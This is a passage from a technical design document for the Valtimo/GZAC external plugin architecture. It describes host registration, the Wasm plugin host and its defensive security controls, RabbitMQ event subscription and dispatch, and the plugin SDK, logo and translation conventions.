  "frontendOrigins": ["https://valtimo.example.com"]
}
```

Broker credentials never reach the browser: the AMQP URL's userinfo is **redacted to `***`** in
every API response (`HostResponse.redactAmqpUserInfo` — both here and on stored host rows in
`GET .../host`); the full URL stays server-side. When the redacted default is echoed back on host
registration, `resolveBrokerAmqpUrl` substitutes the real credentials from `spring.rabbitmq.*`
server-side, so a round-tripped redacted URL never ends up stored.

The operator edits whatever does not match the host's network. URL fields exposed:
`gzacCallbackBaseUrl` is required; `eventBrokerAmqpUrl` and `eventBrokerExchange` are optional.
Leaving the broker URL blank disables events for every configuration under this host. The
`*EventQueueTtlMs` triplet drives the durable-mode TTL input in the UI (default 72h, range 1h–30d);
the constants live on `ExternalPluginHostService` (`DEFAULT_/MIN_/MAX_EVENT_QUEUE_TTL_MS`).

`ExternalPluginHostService.register()` trims trailing `/` on the URLs, encrypts the secret,
blanks become `null`. When a broker URL is supplied it additionally requires the host base URL to be
a confidential transport (HTTPS, or a loopback address for local development) and rejects the
registration otherwise, so the broker AMQP URL and credentials are never pushed over plaintext
(§3.9).

Registration rejections use `ExternalPluginHostValidationException`, which
`ExternalPluginHostValidationExceptionMapper` renders as a **400** whose `detail` is the operator-
facing reason. That matters for the add-host UI: the modal keeps everything the admin typed and
shows the reason inline (`InterceptorSkip: 400` keeps it off the generic error toast), rather than
the catch-all 500-with-a-reference-id it produced before. Two rejections use it today — a broker on a
non-confidential base URL, and a base URL that is a *bind* address (`0.0.0.0`, `::`) rather than an
address GZAC can dial.

The same service exposes **narrowly-scoped update paths** for the two runtime-editable fields.
`baseUrl`, `secret`, `eventBrokerAmqpUrl`, and `eventBrokerExchange` remain immutable — the security
check that pins broker credentials to a confidential `baseUrl` only needs to run at registration.

- `PATCH /api/management/v1/external-plugin/host/{hostId}/event-queue` with
  `{eventQueueMode, eventQueueTtlMs}`. After the PATCH, the resource triggers
  `discoveryService.discoverAll()` so the host's `EventConsumerManager.sync()` swaps the queue
  immediately instead of waiting for the next polling tick.
- `PATCH /api/management/v1/external-plugin/host/{hostId}/frontend-origins` with
  `{frontendOrigins}` — the browser origins allowed to embed this host's plugin screens (§7).
  Each entry is validated and canonicalised to a bare `scheme://host[:port]`; wildcards, paths,
  credentials and non-http(s) schemes are rejected, since a wildcard would defeat the allowlist.
  The new list is pushed to the host immediately, and re-pushed on every discovery poll anyway.

The add-host form pre-fills `frontendOrigins` from `valtimo.web.cors.corsConfiguration.allowedOrigins`
(the browser origins the API already trusts — in a split frontend/backend deployment exactly the
Angular origin set), with wildcard entries dropped. When CORS declares none, the modal falls back to
the admin's own `window.location.origin`: unlike `gzacCallbackBaseUrl`, that *is* the page the plugin
will be embedded in.

## 7. Plugin host 🟡 (`plugin-host/app/`, Node + Fastify + Extism)

Routes: `GET /health`; `PUT /api/host/gzac-instances` (HMAC-signed §3.9; a GZAC instance announces
`{gzacBaseUrl, frontendOrigins}` — see the plugin-content CSP below); `*/api/host/plugins[...]`
(HMAC-signed §3.9; POST upload, GET list —
each listing entry carries the package `contentHash` GZAC pins at discovery, §11 — and DELETE);
`POST|PUT|DELETE|GET /api/host/configurations/:configId` (HMAC-signed §3.9; push body
carries `pluginId, pluginVersion, properties, serviceToken, gzacBaseUrl, eventSubscriptions,
grantedCapabilities, grantedEndpoints` and optionally `eventBroker` and `expectedContentHash` —
only `serviceToken`/`gzacBaseUrl` are actually validated, `pluginId`/`pluginVersion` are not
null-checked beyond the plugin having to be loaded, and a push whose `expectedContentHash` does
not match the loaded package's hash is refused with 409 (§11) so a config and its fresh service
token can never reach package bytes other than the pinned ones); `POST
/plugins/:id/:version/actions/:key`
(HMAC-signed §3.9 — **no GET variant**); public `GET …/plugin-manifest`, `…/logo`,
`…/bundles/**` (bundles and logo are served with the strict plugin-content CSP — see below),
`GET …/frame-policy?origin=` (a public **probe**, answering `{allowed}` for the one origin the
caller names — deliberately not a listing, so it never enumerates which GZAC frontends use this
host), and
`POST …/data` (the `handle_request` RPC route, §13.4/§13.5 — browser-facing
with CORS `*` + `OPTIONS` preflight, so it carries no HMAC, but executing Wasm is gated on a
chain of checks: the request must name a `configurationId` whose pushed configuration exists,
targets this plugin version, **and was granted the `frontend_data` capability** — otherwise 403
with a single deliberately-uninformative message so the public endpoint doesn't leak which
configurations exist; a per-configuration fixed-window rate limit (`DATA_RATE_LIMIT_PER_MINUTE`,
default 120/min, in-memory per replica) bounds abuse; and the request **must carry a GZAC-minted
downscoped `userToken`** (400 when absent), which the host validates by remote introspection
against the configuration's GZAC (`GET /api/v1/external-plugin/user-token/introspect`, the token
itself as bearer credential, bounded by `USER_TOKEN_INTROSPECTION_TIMEOUT_MS`, default 10 s) —
GZAC rejecting the token → 401, a token bound to a **different** configuration than the request
names → 403, GZAC unreachable → 503 (**fail closed**: Wasm never runs on an unvalidated token);
positive verdicts are cached in-memory for ≤60 s (never past the token's own expiry), keyed by a
SHA-256 hash of the token, so steady-state calls cost no GZAC round-trip per call). Multi-version
load keyed `pluginId@version`. The
registered host functions are `gzac_api` (which can also authenticate as the user, §13.4),
`http_request`, `kv`, and `log` — all four gated by a per-configuration capability allowlist (§18).

Configs are **persisted to PostgreSQL**; `ConfigRegistry` sits over `ConfigRepository` with a
**short-TTL in-memory read cache** (`CONFIG_CACHE_TTL_MS`, default 10 s) so hot paths — one lookup
per consumed event per configuration, one per data/action call — don't hit Postgres every time.
Writes through the registry (push/delete) invalidate the cache immediately; a write done by
another replica against the shared database becomes visible after at most the TTL; the
plugin-delete guard's `listByPlugin` reads uncached (staleness there would risk deleting a plugin
a just-pushed configuration references). The plugin manager keeps a **per-plugin-version instance
pool** (`wasm-instance-pool.ts`), sets `prefetch` on the broker channel, and computes each loaded
package's `contentHash` at load time (§11).

**Concurrency.** An Extism instance is not reentrant, so parallelism comes from having several
instances rather than from sharing one. Each call leases an instance from its version's pool:
an idle instance is reused, otherwise one is created while below `WASM_POOL_MAX_INSTANCES`
(default 10), otherwise the caller queues and waits up to `WASM_POOL_ACQUIRE_TIMEOUT_MS`
(default 30 s) before the call fails rather than queueing without bound. Instances above
`WASM_POOL_MIN_INSTANCES` (default 1) are closed as soon as they finish, so a burst does not pin
its peak footprint afterwards. Unload, delete, and shutdown **drain** the pool — they wait for
every in-flight call to finish before its instance is closed, so a call is never killed
mid-execution. Set `WASM_POOL_MAX_INSTANCES=1` for strictly serialised calls. Because handlers for
one configuration can now run concurrently, a plugin must not assume serialised execution —
handlers already had to be idempotent because event delivery is at-least-once, and `kv` writes
already go through the database.

**Execution limits.** Every Wasm call is bounded by a hard wall-clock limit (`WASM_TIMEOUT_MS`,
default 30 s): Extism cancels a timed-out call, and any failing call's instance is dropped rather
than returned to the pool, since a trapped or cancelled instance is in an undefined state. Guest
memory is capped by `WASM_MAX_MEMORY_PAGES` (default 4096 pages = 256 MiB; 0 uncaps), enforced by
**rewriting the module's own memory declaration in memory at instantiation**
(`wasm-memory-limit.ts`) — Extism's own `maxPages` option bounds only the host-side blocks used to
pass input and output across the boundary, while the guest declares and exports its own linear
memory, so a JS plugin's QuickJS heap would otherwise grow far past the configured cap. With a
`maximum` in place `memory.grow` fails, the guest allocator reports out of memory, and the call
fails cleanly while the host serves the next one. The patch is applied to an in-memory copy only,
so the stored package keeps the exact bytes its `contentHash` was pinned against. The worst-case
memory footprint per plugin version is therefore `WASM_POOL_MAX_INSTANCES × WASM_MAX_MEMORY_PAGES`.
Idle instances — each holding a worker thread plus Wasm memory — are evicted by a periodic sweep
after `WASM_INSTANCE_IDLE_TTL_MS` (default 10 min) without a call, including below the pool
minimum, so a quiet host returns to zero instances; the next call transparently re-instantiates.
All four exports (`handle_action`/`handle_event`/`handle_request`/`handle_submit`) funnel through
one generic `callExport`; the public `callAction`/`callEvent`/`callRequest`/`callSubmit` wrappers
only shape their input and host context.

- **Action HTTP body** (GZAC→host): `{configurationId, processInstanceId, activityId, documentId?,
  properties}` — note it does **not** carry `actionKey` (URL param) or `configuration` (looked up
  host-side from the registry). Before the invocation, `ExternalPluginServiceTaskStartListener`
  resolves the link's action properties against the process context: a textual value is routed
  through `ValueResolverService` **only when a resolver factory actually supports its prefix**
  (`ValueResolverService.supportsValue` — `pv:`, `doc:`, `case:`, …); a literal that merely
  contains a colon (e.g. `https://example.com`) passes through untouched instead of tripping the
  resolver on an unknown prefix. The host assembles the **Wasm input** `{actionKey, configurationId,
  configuration, processInstanceId, documentId, activityId, properties}`; output `{status,
  variables, result?}` (plus `{errorCode, errorMessage}` on failure, surfaced to the process as a
  BPMN error). `variables` is applied as plain Operaton process variables; the optional `result`
  is a separate channel evaluated only by the link's `action_result_mappings` (§21) — the two
  never interfere, and a plugin that returns no `result` simply has nothing to map. On the GZAC
  side, `ExternalPluginHostClient` maps **every** failure mode of an action/submit invocation onto
  a structured `ActionResponse` so the callers' error paths always engage: a 4xx/5xx from the host
  becomes the host's status plus its parsed error body, and a connection failure or timeout
  becomes a synthetic 503 carrying `errorCode: EXTERNAL_PLUGIN_HOST_UNREACHABLE` — an unreachable
  host surfaces to the process as a BPMN error like any other action failure.
- **Plugins run under Extism with `runInWorker: true`** so async host functions (`gzac_api`) can
  suspend the Wasm call until the host's fetch resolves. **This requires Node ≥ 22** (older Node
  fails to spawn the worker with `invalid execArgv flags: --disable-warning`).
- **`DELETE /api/host/plugins/:pluginId/:version`** refuses removal with HTTP 409 if any active
  configurations on the host reference the plugin version
  (`configRegistry.listByPlugin(pluginId, version)`), returning the offending `configurationIds`.
- **Upload safety** (`POST /api/host/plugins`): the package size is capped (`UPLOAD_MAX_BYTES`,
  default 25 MB; a truncated multipart stream is rejected explicitly with 413 rather than slipping
  through as a corrupt zip), and the zip is extracted **entry by entry** with zip-slip protection
  (`safeExtractPluginZip`): every entry's resolved destination must stay inside the extraction
  directory — a crafted `../`, absolute, or drive-letter entry name rejects the whole package with
  400 — and only the files a plugin package may legitimately carry are extracted (root-level
  `manifest.json`, `plugin.wasm`, the logo, and `frontend/**`), so a hostile zip cannot plant
  anything else even inside the temp dir. **The package's identity cannot name a path**: the shared
  validator restricts `pluginId`/`version` to a charset that cannot express a traversal or a hidden
  directory, and `manifest.logo` to a plain image file at the package root — the plugin manager
  re-checks the same rules before it builds any path, so a bad identity reaching it another way
  still cannot write outside `PLUGIN_STORAGE_DIR`. The route additionally requires the resolved
  logo to sit directly inside the extraction directory, since it is copied into the stored package
  and into the content hash GZAC pins. **A version is never replaced silently**: an upload whose
  manifest names a `pluginId@version` that already exists — loaded in memory *or* present on disk
  (`hasVersion`) — is refused with 409 carrying `code: PLUGIN_VERSION_EXISTS` and both content
  hashes (the loaded package's and the uploaded package's, so callers can tell an identical
  re-upload apart from different content). The existence check and the store run inside **one
  critical section per `pluginId@version`**, so two concurrent uploads of the same version produce
  exactly one 201 and one 409 instead of both passing the check and interleaving their writes.
  Only `?overwrite=true` — which GZAC sends after an admin explicitly confirmed the overwrite and
  re-reviewed the requested permissions (§11) — replaces the package (hot-reload; logged as a warn
  for audit). The store **replaces the version directory atomically**: the package is written to a
  staging sibling, hashed, then swapped in by renaming the previous directory aside and the staging
  directory into place, so a partial write is never visible and an overwrite leaves no file from
  the previous package behind. A package that fails to load rolls the swap back, restoring the
  previous package. The 201 response carries the stored package's `contentHash` (§11).
- **Plugin-content CSP** (`routes/plugin-bundles.ts`): every response serving plugin-authored
  content — `…/bundles/**` **and** the logo (an SVG can carry script) — carries
  `Content-Security-Policy: default-src 'none'; script-src 'self'; style-src 'self'
  'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self'; media-src 'self';
  form-action 'self'; base-uri 'none'; object-src 'none'; sandbox allow-scripts allow-forms`,
  plus `X-Content-Type-Options: nosniff` and `Referrer-Policy: no-referrer`. The iframe sandbox
  (§13.2) stops *escalation*; this policy closes the *exfiltration* channels a hostile bundle
  would otherwise have — `connect-src 'self'` kills fetch/XHR/beacon to third parties (opaque-
  origin requests go out with `Origin: null`, which plenty of endpoints accept), `script-src
  'self'` kills remote script loading, `img-src`/`font-src` kill pixel-beacon exfil, and
  `form-action 'self'` kills native form posts to external endpoints. An honest plugin loses
  nothing: its GZAC traffic flows through the parent-proxy postMessage transport and its own
  assets live under the bundle path. The CSP `sandbox` directive mirrors the embedding iframe's
  attribute, so a bundle opened directly in a top-level tab is confined to an opaque origin too,
  instead of running same-origin with the host.
- **`frame-ancestors`** is the one directive computed per request, and it closes a different hole:
  *who may embed the plugin*. The iframe holds no credential, but an attacker-controlled page that
  can frame a bundle answers the plugin's proxied calls itself and renders a convincing off-origin
  fake. The allowlist is the union of the origins every GZAC instance has announced
  (`PUT /api/host/gzac-instances`, persisted in `gzac_instances`, ignored once older than
  `FRAME_ANCESTOR_STALE_MS` — there is no deregistration call, so ageing out is what removes a
  decommissioned GZAC) and the `ALLOWED_FRAME_ANCESTORS` env escape hatch. GZAC re-announces on
  every discovery poll, which makes the allowlist self-healing: a newly connected GZAC becomes
  framable within one cycle with neither side restarted. **Fail closed** — with no origins at all
  the host serves `frame-ancestors 'none'` plus `X-Frame-Options: DENY` (the older header has no
  allowlist form, so it is only sent in that all-deny case) and logs once naming both ways to
  populate the list. Lookups go through a short-TTL cached registry (`frame-ancestor-registry.ts`,
  reusing `CONFIG_CACHE_TTL_MS`) because this sits on the bundle hot path. The frontend SDK
  additionally probes `…/frame-policy` before trusting an `init` from an unknown parent origin —
  defence in depth for proxies that strip CSP; an explicit `allowed: false` refuses init, while an
  unanswerable probe only warns.

Environment (`models/app-config.ts`): `ADMIN_TOKEN` (required — the shared secret used as the
HMAC key for every GZAC→host route, §3.9), `PORT` (8090),
`PLUGIN_STORAGE_DIR` (`./plugins`), `LOG_LEVEL` (info), `HOST_ID` (defaults to the OS hostname;
see §8.4), the execution/abuse bounds `WASM_TIMEOUT_MS` (30 s), `WASM_MAX_MEMORY_PAGES` (4096),
`WASM_INSTANCE_IDLE_TTL_MS` (10 min), the instance-pool bounds `WASM_POOL_MIN_INSTANCES` (1),
`WASM_POOL_MAX_INSTANCES` (10) and `WASM_POOL_ACQUIRE_TIMEOUT_MS` (30 s),
`GZAC_API_TIMEOUT_MS` (60 s), `UPLOAD_MAX_BYTES` (25 MB),
`DATA_RATE_LIMIT_PER_MINUTE` (120) and `CONFIG_CACHE_TTL_MS` (10 s), plus `DB_HOST` / `DB_PORT`
`ALLOWED_FRAME_ANCESTORS` (unset — extra browser origins allowed to frame plugin content, on top of
those GZAC announces) and `FRAME_ANCESTOR_STALE_MS` (7 days — how long a GZAC instance stays in the
allowlist without re-announcing), plus `DB_HOST` / `DB_PORT`
(defaults to **5434**, not the standard 5432) / `DB_NAME` / `DB_USER` / `DB_PASSWORD` for the
host's PostgreSQL, and optional `TLS_CERT_PATH` / `TLS_KEY_PATH` (set together to serve HTTPS —
§3.9) plus `TLS_CA_PATH` for a certificate chain. `HOST_ALLOW_HTTP` / `HOST_ALLOW_PRIVATE_NETWORK`
relax the `http_request` target policy for local development (§18.6),
`HOST_ALLOWED_INTERNAL_CIDRS` (unset — comma-separated CIDRs this host may reach despite being
private, the production alternative to `HOST_ALLOW_PRIVATE_NETWORK`, §18.6), and
`LOG_RETENTION_DAYS` (30) drives the log-retention job (§18.9). **No broker variables** — the host
never configures a broker itself.

Gaps to close for production: no HTMX `render_page`.
Host capabilities (`gzac_api`, `http_request`, `kv`, `log`, `frontend_data`) and their persistent
storage are covered in §18.

## 8. Event subscription & delivery ✅

End-to-end, an event the core app emits is delivered to every subscribed plugin configuration's
`handle_event`, which may call back into the core app.

```
GZAC domain event
  └─ OutboxService (same TX)  → outbox_message
       └─ PollingPublisherJob (~3s) → RabbitMessagePublisher.convertAndSend("valtimo-events", "", cloudEvent)
            └─ exchange valtimo-events (fanout, durable)
                 ├─ valtimo-audit  (core app's own consumer)
                 ├─ valtimo-inbox  (core app's own consumer)
                 └─ valtimo-external-plugins.<exchange>.<HOST_ID>   ← each plugin host's own queue
                      └─ EventConsumerManager → handle_event(EventInput) → onEvent(...)
                           └─ optional gzac_api callback (service token + allowlist enforced)
```

### 8.1 Publish (core app)

Domain events extend `com.ritense.outbox.domain.BaseEvent` and are serialized as CloudEvents v1.0
JSON by `CloudEventFactory`. `RabbitMessagePublisher` sends them with
`convertAndSend(exchange, routingKey, body)` where `exchange = valtimo-events` (from
`valtimo.outbox.publisher.rabbitmq.exchange`) and `routingKey` is empty. `valtimo-events` is a
**fanout, durable** exchange declared in `backend/app/gzac/imports/gzac-rabbitmq/definitions.json`
(also bound to the core app's `valtimo-audit` and `valtimo-inbox` queues).

### 8.2 Per-host broker and granted subscriptions, pushed by GZAC

The plugin host is **not** configured with a broker URL via env variables. It learns each
configuration's broker from the GZAC push, so one host can serve many GZAC instances and many
hosts can serve one instance.

`ExternalPluginConfigurationService.pushToHost(config, definition, host)` reads:
- The broker fields off the host row, with `host.eventBrokerExchange` falling back to the outbox
  exchange when null and `exchangeType` hardcoded `fanout`. `eventBrokerAmqpUrl` being null
  causes the entire `eventBroker` block to be omitted from the push body — actions still work,
  events don't.
- The granted event types off `external_plugin_granted_event` for this configuration. These are
  sent as the push body's `eventSubscriptions` array — the host's authoritative subscription set
  for this configuration, matching the manifest's declared list (§3.1).
- The granted capabilities off `external_plugin_granted_capability`, sent as the push body's
  `grantedCapabilities` array — the allowlist the host's `guardHostCall` checks on every host
  function invocation (§18.4).

`pushToHost` is deliberately **not** transactional — it performs HTTP I/O and must never run
inside a database transaction. Activation and update register the push as an after-commit action
(`runAfterCommit`), so a slow or unreachable host can never pin a database transaction open; a
failed push is a warning only, self-healed by the next discovery re-sync. Configuration deletes
remove the config from the host through the same after-commit mechanism. `pushToHost` refuses to
push at all — every caller funnels through it — while the definition's package content awaits
re-acceptance (§11): no push means no fresh service token for package bytes the admin has not
accepted.

Push body shape (relevant fields):

```json
{
  "pluginId": "case-summary",
  "pluginVersion": "0.1.0",
  "properties": { },
  "serviceToken": "eyJ…",
  "gzacBaseUrl": "http://gzac:8080",
  "expectedContentHash": "sha256:…",
  "eventSubscriptions": ["com.ritense.valtimo.document.created", "com.ritense.valtimo.task.completed"],
  "grantedCapabilities": ["gzac_api", "log"],
  "grantedEndpoints": [{"method": "GET", "pattern": "/api/v1/document/*"}],
  "eventBroker": {
    "amqpUrl": "amqp://…",
    "exchange": "valtimo-events",
    "exchangeType": "fanout",
    "queueMode": "live",
    "queueTtlMs": null
  }
}
```

`expectedContentHash` is the definition's pinned package hash (§11; omitted while none is pinned).
The host verifies its loaded package still matches before accepting the push and answers 409
otherwise, closing the window between GZAC's discovery cycle and the push itself.

Every push carries the configuration's granted endpoint list as a `grantedEndpoints` array
(`{method, pattern}` entries), persisted in the host's `granted_endpoints` column (`NULL` when a
push carries no array) and enforced host-side by `gzac_api` (§3.5): the array is filtered to
well-formed entries and an **empty result denies all**, while a configuration whose push carried
no list at all is allowed with a warning (compatibility for pushes from other clients) — GZAC's
server-side allowlist filter (§3.4) remains the authoritative gate either way.

`queueMode` is `"live"` or `"durable"` (lowercased on the wire — the host's `normalizeEventBroker`
defaults unknown/absent values to `"live"`, so older GZACs that don't push it stay compatible).
`queueTtlMs` is present only when `queueMode === "durable"` and is clamped defensively to the
1h–30d window even though GZAC validates the same bounds at registration / PATCH time.

### 8.3 Consume (host, `rabbitmq/event-consumer.ts`)

`EventConsumerManager` keeps one `BrokerConsumer` per **distinct broker**
(`brokerKey = amqpUrl + exchange + exchangeType`). Note: `queueMode`/`queueTtlMs` are intentionally
**not** in the broker key — they are queue-level concerns, not connection-level, so two
configurations on the same broker still share a single connection while the queue arguments come
from the host-wide mode. After any configuration mutation the route calls `sync()` (serialised via
a promise chain): it opens consumers for newly referenced brokers and closes consumers no
configuration references any more. A `BrokerConsumer`:
- `assertExchange(exchange, exchangeType, { durable: true })`,
- `assertQueue("valtimo-external-plugins.<exchange>.<HOST_ID>.<queueMode>", …)` with arguments
  switched per mode:
  - **`live`** (default): `{ durable: false, autoDelete: true }` — queue evaporates when the host
    disconnects; events while the host is fully down are lost (live-subscription semantics).
  - **`durable`**: `{ durable: true, autoDelete: false, arguments: { "x-expires": queueTtlMs } }` —
    queue survives host restarts; `x-expires` deletes the queue after `queueTtlMs` of no-consumer
    inactivity, so a host that vanishes permanently doesn't accumulate events forever.

  The mode suffix in the queue name means flipping `queueMode` produces a different queue and so
  never collides with the previous queue's `assertQueue` arguments — the old `.live` queue
  auto-deletes on disconnect; an orphan `.durable` queue lingers until its `x-expires` fires or an
  operator deletes it from the management UI.
- `bindQueue(queue, exchange, "")` (fanout ignores the routing key),
- `consume(..., { noAck: false })` — ack on success; a malformed message is `nack`-dropped (not
  requeued) to avoid a poison loop. There is **no DLQ** today; expired or dropped messages are
  silently lost.

Restart behaviour: configs are persisted in the host's PostgreSQL (`plugin_configurations` table).
On boot the host calls `eventConsumerManager.sync()` which re-opens consumers for every config
that still carries an `eventBroker.amqpUrl`. Expect a `"Broker consumer started"` log line at
startup if any persisted configs reference a broker, even before GZAC sends a fresh push.

**Self-healing reconnect.** Once `BrokerConsumer.start()` has succeeded the consumer owns its own
reconnect loop: an unexpected `close` on the AMQP connection schedules a backed-off reconnect
(`1s, 2s, 4s, …`, capped at 30s with 50–100 % jitter) and the consumer stays in the manager's map
across the gap, so delivery resumes without a configuration push or host restart. A successful
reconnect resets the backoff and re-asserts the exchange, queue, binding, and `consume`. The loop
terminates only on intentional close — when the manager's `sync()` removes a broker that is no
longer referenced by any configuration, or when the host shuts down. The initial `start()` call
keeps its strict contract: if connecting to a broker that has *never* worked fails, the consumer is
left out of the map and the next `sync()` retries — only post-success drops are self-healed. The
auto-delete live-subscription queue (§8.4) is re-created on every reconnect, so events published
during a disconnected window are still not retained for the host.

### 8.4 Dispatch & multi-host topologies

For each consumed CloudEvent the manager iterates the config registry and invokes `handle_event`
for every configuration that (a) carries the **same broker key** as the consuming connection (so
instance A's events never reach instance B's configs) **and** (b) whose stored
`eventSubscriptions` (the granted set pushed by GZAC, persisted in the host's
`plugin_configurations.event_subscriptions` column) contains the CloudEvent `type`.

The manifest's declared `eventSubscriptions` is **not consulted at dispatch time** — only the
granted set is. This is the security gate that prevents a plugin author from silently expanding
the dispatched event set: publishing a new plugin version that adds an event type to the manifest
does not start delivering that type until an admin explicitly re-grants. The same configuration's
running v2 keeps receiving only what was originally accepted.

The Wasm `EventInput` is the flattened event (`type, id, source, time, userId, roles, resultType,
resultId, result`) plus the configuration's `properties`. `serviceToken` and `gzacBaseUrl` ride in
the Extism per-call `hostContext`, so an event handler's `gzac_api` callback is authenticated and
allowlist-enforced exactly like an action's.

Multi-host topologies:
- *Different* hosts on one GZAC instance have distinct queues → **every host receives a copy** of
  each event.
- *Replicas of the same host* (shared `HOST_ID`) bind the **same** queue and become competing
  consumers → each event is handled by **exactly one** replica.
- *One host serving multiple GZAC instances*: each instance has its own broker, so the host opens
  a separate `BrokerConsumer` per broker. Dispatch only fires configurations whose pushed broker
  key matches the consuming connection.
- Durability trade-off (configurable per host): `live` mode preserves today's no-overhead
  semantics — events published while the host is fully down are not retained. `durable` mode
  retains buffered events up to `queueTtlMs` since the last consumer disconnected, at the cost of
  a queue that has to be cleaned up if a host is deprovisioned and its `HOST_ID` never returns
  (the TTL is the automatic cleanup). Plugin handlers must already be idempotent because gzac's
  outbox is at-least-once, so durable replay does not change handler-correctness requirements.

### 8.5 SDK & declaration

A plugin declares the CloudEvent types it cares about in `manifest.json`:

```json
"eventSubscriptions": ["com.ritense.valtimo.document.created", "com.ritense.valtimo.task.completed"]
```

and registers a handler with `onEvent` (`plugin-sdk/src/events.ts`); the SDK runtime
(`plugin-sdk/src/runtime.ts`) exports `handle_event`, settling async handlers synchronously under
QuickJS and reporting `{status: "completed" | "ignored" | "error"}`. Multiple handlers may
register; all run per event.

## 9. SDK & developer experience ✅

A plugin author writes `src/plugin.ts`: import `{action, onEvent, request, config, gzacApi, log}`
from `@valtimo/plugin-sdk`; `action("key", (input) => ({status, variables}))`;
`onEvent((event) => …)`; `request("/path", (input) => ({status, body}))` for iframe-served JSON
data (§13.4); read config via synchronous `config.get()`; call `gzacApi.{get,post,put,delete}()`
as the **service token**, or `gzacApi.asUser.{…}()` as the **downscoped user token** (§13.4) — both
synchronous from the plugin's view (the host suspends the call). Build: `valtimo-plugin-build`
(esbuild → `extism-js`) then `valtimo-plugin-pack` (zip of `manifest.json` + `plugin.wasm` +
`frontend/` + optional `logo.{svg,png,jpg,jpeg}`).

DX done: the build auto-generates the Wasm interface (`handle_action` + `handle_event` +
`handle_request` exports + `gzac_api` import) so authors write only `src/plugin.ts`; the runtime
settles returned promises and never serialises a pending `Promise`; the pack copies `manifest.json`
verbatim so `eventSubscriptions`, `permissions`, and `translations` carry through — additionally
stamping the SDK package's own version onto the in-zip manifest as `sdkVersion`, so the host can
tell which SDK/ABI a stored plugin targets (the upload validator requires it to be a non-empty
string when present) — and compiles each
`frontend/*.tsx` referenced by a `frontend/*.html` `<script>` into a `*.bundle.js` (e.g. the
`config`, `process-link-action`, and `case-tab` bundles).

`PluginManifest` is defined once in `@valtimo/plugin-sdk/src/models/types.ts`; the host app's
`models/plugin-manifest.ts` re-exports from the SDK so there is a single source of truth. The
manifest has **no top-level `name`/`description`** — those live per-locale under `translations`
(§10). The type encodes this: `translations` is required and each bucket is a `PluginTranslations`
(`{ name: string; description: string; [key: string]: string }`).

**Manifest validation, defined once (`@valtimo/plugin-sdk/manifest-validation`).**
`validatePluginManifest(manifest)` lives in its own dependency-free SDK module exposed via the
`./manifest-validation` subpath export, so it can be consumed without pulling in the plugin-author
runtime. It is the single rule set enforced at **both** gates, each importing it via the same
`@valtimo/plugin-sdk/manifest-validation` subpath: the pack tool (`bin/valtimo-plugin-pack.mjs`,
build-time, self-references the package's own export) and the plugin host's upload route
(`routes/host-management.ts`, runtime, returns HTTP 400 `{error, details[]}` on failure). It
requires a valid `pluginId`/`version` (see below), a non-empty `translations` object, and a
non-empty `name` **and** `description` string in **every** declared locale bucket.

**Package identity rules.** `pluginId` and `version` become directory names under
`PLUGIN_STORAGE_DIR` and segments of public URLs, so the validator restricts them to a charset that
cannot express a traversal or a hidden directory: 1–64 characters, a letter or digit at both ends,
and `.`/`-`/`_` only inside. `pluginId` is **lowercase-only**, because a case-insensitive filesystem
would fold `Foo` and `foo` into one package directory while the database treats them as two distinct
definitions; `version` additionally allows uppercase and `+` so semver prerelease/build metadata
such as `1.0.0-RC1+build.5` stays expressible. `logo`, when present, must be a plain file name at
the package root ending in `.svg`, `.png`, `.jpg` or `.jpeg`. Being in the shared validator means
these rules are enforced at pack time *and* upload time by construction; the plugin manager re-checks
them before building any path, so no identity that reached it another way can write outside the
storage directory.

Frontend SDK (`@valtimo/plugin-sdk/frontend`):
- `ValtimoPluginSDK` running inside the iframe communicates with the Angular parent via
  postMessage (`init`, `save`, `prefillConfiguration`, `ready`, `configurationChanged`, etc.).
- **Parent-origin pinning.** The SDK only exchanges messages with one origin. An optional
  constructor option `parentOrigin` pins it explicitly (recommended for production bundles);
  when omitted — required when the same bundle must run under several Valtimo frontends whose
  origin isn't known at build time — the SDK pins the origin of the **first validated `init`
  message** and ignores every other origin from then on. Until the pin is established, only the
  credential-free handshake events (`ready`, `resize`) are posted to `"*"`; anything that carries
  data is **queued** and flushed to the pinned origin after `init`. (The iframe itself runs at an
  opaque origin, but the parent's messages still carry the parent's real origin — so pinning works
  either way.)
- **Parent-proxy data access (§13.2):** `sdk.callValtimo(method, path, body?)` and
  `sdk.getPluginData(path, query?)` return a `Promise<{status, body}>`. Each emits a
  correlation-id-keyed `proxyRequest` to the parent and resolves on the matching `proxyResponse`;
  the iframe holds no token — the parent attaches the downscoped user token (GZAC) or forwards to the
  host `/data` route (plugin data) and returns the **data only**.
- `sdk.t(key, fallback?)` returns the translation for the current locale (`en` fallback, then
  raw key). Translations come from `manifest.translations[locale]`, fetched on construction from
  the host's `/plugins/:id/:version/plugin-manifest` route. The manifest URL is derived from
  `window.location.href` (not `origin`, which serialises to `"null"` at the opaque origin), and the
  manifest route serves `Access-Control-Allow-Origin: *` so the cross-origin fetch from the opaque
  iframe succeeds.
- `sdk.ready()` resolves once **both** the manifest fetch completes **and** the parent's `init`
  message has arrived (or 2 s timeout); mount React inside `sdk.ready().then(...)` so the very
  first render uses the correct locale instead of flashing `en`.

## 10. Plugin assets — logo and translations ✅

**Logo.** Convention: drop `logo.svg`, `logo.png`, `logo.jpg`, or `logo.jpeg` next to
`manifest.json`. The pack tool detects the first match, includes the file at the zip root, and
writes `"logo": "logo.svg"` into the manifest *inside the zip* (the source `manifest.json` on
disk is untouched). Because the host copies that file into the stored package — and therefore into
the content hash GZAC pins — `logo` must name a plain image file at the package root and nothing
else (§9); the upload route additionally requires the resolved path to sit directly inside the
extraction directory. The host serves it at `GET /plugins/:id/:version/logo` with the right
Content-Type. `DefinitionResponse.logoUrl` exposes the absolute URL to the management UI, which
renders it (a) in the "Configure plugin" tile (`plugin-add-select.component.html`) and (b) in the
process-link plugin picker (`select-plugin-configuration.component.ts`) — the same surfaces that
already render `pluginLogoBase64` for embedded plugins.

**Translations.** Manifest's top-level `translations: { "en": {...}, "nl": {...} }` block ships
in the package and is exposed to the iframe via the same plugin-manifest endpoint. The frontend
SDK fetches it on construction. `sdk.t(key)` reads the active locale's bucket; the active locale
comes from the Angular `TranslateService.currentLang` and is passed by
`ExternalPluginIframeComponent.onIframeLoad()` in the `init` postMessage payload. Falls back to
`defaultLang`, then `en`. Sample plugin (`case-summary`) has both `en` and `nl` buckets covering
every label, placeholder, and helper text; React components mount inside `sdk.ready().then(...)`
so users never see raw translation keys flash on screen.

**Name & description are translations ✅.** The plugin's display **name** and **description** are
`name`/`description` keys inside **each** locale bucket — there are no top-level `name`/
